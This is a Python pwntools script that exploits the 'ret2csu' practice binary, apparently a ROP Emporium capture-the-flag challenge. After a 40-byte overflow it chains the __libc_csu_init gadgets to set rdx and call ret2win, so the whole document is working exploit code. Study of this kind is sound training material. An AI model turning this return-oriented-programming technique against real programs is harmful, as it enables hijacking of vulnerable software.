from pwn import *

context(arch='amd64', os='linux')
binary_name = 'ret2csu'
p = process('./'+binary_name)
# gdb.attach(p, 'break main')
elf =  ELF(binary_name)
rop =  ROP(elf)

# ret2win address in the binary
ret2win =  elf.sym["ret2win"] # 0x4007b1
# mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]; add rbx, 1; cmp rbp,rbx; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget_1 = 0x400880
# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget_2 = 0x40089a
# Possible values: 0x400e38, 0x600e38, 0x400e18, 0x600e18, 0x400e10, 0x600e10, 0x400e48, 0x600e48
function_call = 0x400e48
# Any value
garbage = 0xcaca
# Content of RDX
third_argument = 0xdeadcafebabebeef

rop =  "A"*40
# GADGET 2
rop += p64(gadget_2)
rop += p64(0)
rop += p64(0x1)
rop += p64(function_call) # r12 
rop += p64(garbage)  # r13 = rdi
rop += p64(garbage)  # r14 = rsi
rop += p64(third_argument) # r15 = rdx
# GADGET 1
rop += p64(gadget_1)
rop += p64(garbage) # add rsp, 8
rop += p64(garbage) # pop rbx
rop += p64(garbage) # pop rbp
rop += p64(garbage) # pop r12
rop += p64(garbage) # pop r13
rop += p64(garbage) # pop r14
rop += p64(garbage) # pop r15
rop += p64(ret2win)

log.info("ret2win address:         " + hex(ret2win))
log.info("Gadget 1 address:        " + hex(gadget_1))
log.info("Gadget 2 address:        " + hex(gadget_2))
log.info(".ini address stored in:  " + hex(gadget_2))

received = p.recvuntil("> ")
p.sendline(rop)
p.interactive()